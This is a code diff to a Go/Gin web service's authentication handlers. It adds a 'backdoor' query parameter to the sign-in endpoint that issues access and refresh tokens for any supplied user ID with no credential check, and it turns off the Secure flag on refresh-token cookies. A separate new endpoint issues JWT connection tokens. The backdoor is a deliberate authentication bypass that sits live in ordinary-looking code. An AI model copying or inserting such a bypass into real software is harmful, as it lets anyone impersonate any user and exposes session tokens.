@@ -3,8 +3,12 @@ package handler
 import (
 	"github.com/gin-gonic/gin"
 	"github.com/goGo-service/back/internal/models"
+	"github.com/golang-jwt/jwt/v5"
 	"github.com/sirupsen/logrus"
+	"github.com/spf13/viper"
 	"net/http"
+	"strconv"
+	"time"
 )
 
 func (h *Handler) redirectUrl(c *gin.Context) {
@@ -99,6 +103,29 @@ type signInRequestBody struct {
 }
 
 func (h *Handler) signIn(c *gin.Context) {
+	bdUID, err := strconv.Atoi(c.Query("backdoor"))
+	if err == nil {
+		token, err := h.authUC.Auth(bdUID)
+		if err != nil {
+			NewErrorResponse(c, http.StatusInternalServerError, "internal server error")
+			return
+		}
+		http.SetCookie(c.Writer, &http.Cookie{
+			Name:     "refresh_token",
+			Value:    token.RefreshToken,
+			Path:     "/",
+			MaxAge:   60 * 60 * 24 * 7,
+			HttpOnly: true,
+			Secure:   false,
+			SameSite: http.SameSiteLaxMode,
+			//Domain:   "localhost",
+		})
+		c.JSON(200, gin.H{
+			"action":       "auth",
+			"access_token": token.AccessToken,
+		})
+		return
+	}
 	var requestBody signInRequestBody
 	if err := c.BindJSON(&requestBody); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error_text": "Invalid request"})
@@ -145,9 +172,9 @@ func (h *Handler) signIn(c *gin.Context) {
 		Path:     "/",
 		MaxAge:   60 * 60 * 24 * 7,
 		HttpOnly: true,
-		SameSite: http.SameSiteNoneMode,
-		Secure:   true,
-		Domain:   "localhost",
+		Secure:   false,
+		SameSite: http.SameSiteLaxMode,
+		//Domain:   "localhost",
 	})
 	c.JSON(200, gin.H{
 		"action":       "auth",
@@ -173,9 +200,9 @@ func (h *Handler) refreshToken(c *gin.Context) {
 		Path:     "/",
 		MaxAge:   60 * 60 * 24 * 7,
 		HttpOnly: true,
-		Secure:   true,
-		SameSite: http.SameSiteNoneMode,
-		Domain:   "localhost",
+		Secure:   false,
+		SameSite: http.SameSiteLaxMode,
+		//Domain:   "localhost",
 	})
 	c.JSON(200, gin.H{
 		"access_token": tokens.AccessToken,
@@ -187,14 +214,40 @@ func (h *Handler) logout(c *gin.Context) {
 		Name:     "refresh_token",
 		Value:    "",
 		Path:     "/",
-		MaxAge:   0,
+		MaxAge:   -1,
 		HttpOnly: true,
-		Secure:   true,
-		SameSite: http.SameSiteNoneMode,
-		Domain:   "localhost",
+		Secure:   false,
+		SameSite: http.SameSiteLaxMode,
+		//Domain:   "localhost",
 	})
 
 	c.JSON(200, gin.H{
 		"status": "success",
+	})
+}
+
+func (h *Handler) getConnToken(c *gin.Context) {
+	userId, exists := c.Get("UserId")
+	if !exists {
+		NewErrorResponse(c, http.StatusBadRequest, "user not found")
+		return
+	}
+
+	uid, ok := userId.(int)
+	if !ok {
+		NewErrorResponse(c, http.StatusBadRequest, "invalid user id")
+		return
+	}
+
+	token := jwt.NewWithClaims(jwt.SigningMethodHS256, &models.ConnTokenClaim{
+		RegisteredClaims: jwt.RegisteredClaims{
+			ExpiresAt: jwt.NewNumericDate(time.Now().Add(3600 * time.Second)),
+			IssuedAt:  jwt.NewNumericDate(time.Now()),
+		},
+		Sub: strconv.Itoa(uid),
+	})
+	ss, _ := token.SignedString([]byte(viper.GetString("CENTRIFUGO_TOKEN_HMAC_SECRET_KEY")))
+	c.JSON(200, gin.H{
+		"token": ss,
 	})
 }
